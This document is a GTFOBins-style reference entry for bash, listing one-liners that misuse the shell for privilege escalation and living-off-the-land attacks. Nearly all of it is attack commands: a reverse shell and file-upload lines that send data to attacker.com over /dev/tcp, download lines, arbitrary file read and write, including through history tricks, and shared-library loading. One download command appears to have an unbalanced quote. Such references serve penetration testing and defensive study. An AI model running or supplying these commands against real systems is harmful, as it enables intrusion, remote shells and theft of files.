---
type: gtfobin
name: bash
platform: Unix
functions: [download, file-read, file-write, library-load, reverse-shell, shell, upload]
tags: [gtfobin, unix, lotl]
---

# bash

## download

```bash
bash -c '{ echo -ne "GET /path/to/input-file HTTP/1.0\r\nhost: attacker.com\r\n\r\n" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/attacker.com/12345 \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } >/path/to/output-file'
```
**Contexts:** sudo, suid, unprivileged

```bash
bash -c 'echo "$(</dev/tcp/attacker.com/12345) >/path/to/output-file'
```
**Contexts:** sudo, suid, unprivileged

## file-read

```bash
bash -c 'echo "$(</path/to/input-file)"'
```
**Contexts:** sudo, suid, unprivileged

```bash
HISTTIMEFORMAT=$'\r\e[K'
history -c
history -r /path/to/input-file
history
```
_This only works interactively from an existing `bash` session._
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
bash -c 'echo DATA >/path/to/output-file'
```
**Contexts:** sudo, suid, unprivileged

```bash
HISTIGNORE='history *'
history -c
DATA
history -w /path/to/output-file
```
_This only works interactively from an existing `bash` session. It adds timestamps to the output file._
**Contexts:** sudo, suid, unprivileged

## library-load

```bash
bash -c 'enable -f /path/to/lib.so x'
```
**Contexts:** sudo, suid, unprivileged

## reverse-shell

```bash
bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1'
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
bash
```
**Contexts:** sudo, suid, unprivileged

## upload

```bash
bash -c 'echo -e "POST / HTTP/0.9\n\n$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
```
**Contexts:** sudo, suid, unprivileged

```bash
bash -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
```
**Contexts:** sudo, suid, unprivileged
